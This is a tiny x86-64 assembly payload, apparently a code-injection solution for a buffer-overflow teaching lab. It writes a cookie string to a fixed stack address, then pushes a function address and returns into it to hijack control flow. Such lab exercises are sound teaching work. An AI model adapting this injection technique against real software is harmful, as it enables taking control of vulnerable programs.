movq $0x5561dca8,%rdi
movq $0x6166373939623935,%rax
movq %rax,(%rdi)
movb $0x00,0x8(%rdi)
pushq $0x4018fa
ret